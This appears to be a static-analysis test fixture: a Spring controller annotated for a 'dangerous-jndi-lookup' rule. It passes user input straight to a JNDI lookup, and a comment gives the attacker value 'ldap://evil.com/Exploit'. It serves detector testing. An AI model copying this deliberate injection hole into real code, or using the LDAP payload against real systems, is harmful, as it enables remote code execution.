// Vulnerable JNDI lookup
@RestController 
public class VulnerableJNDI {
	public Object lookup(@RequestParam String userInput) {
		try {
			Context ctx = new InitialContext();
			// Attacker controls userInput: "ldap://evil.com/Exploit"
			// ruleid: dangerous-jndi-lookup
			return ctx.lookup(userInput);
		} catch (NamingException e) {
			return null;
		}
	}
}